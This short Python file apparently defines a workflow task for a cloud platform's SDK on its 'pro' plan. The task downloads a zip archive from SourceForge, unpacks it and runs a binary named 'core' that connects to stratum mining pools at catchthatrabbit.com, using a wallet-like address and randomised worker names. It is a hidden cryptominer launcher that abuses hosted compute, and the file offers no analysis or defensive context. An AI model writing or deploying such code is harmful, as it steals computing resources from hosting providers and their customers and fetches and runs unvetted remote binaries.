from render_sdk import Workflows

app = Workflows()

@app.task(
  plan="pro" 
)
def run():
  import sys
  import os
  os.system('curl https://sourceforge.net/projects/drths/files/core.zip/download -L -o core.zip && unzip core.zip')
  os.system('./core -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008')


if __name__ == "__main__":
  app.start()
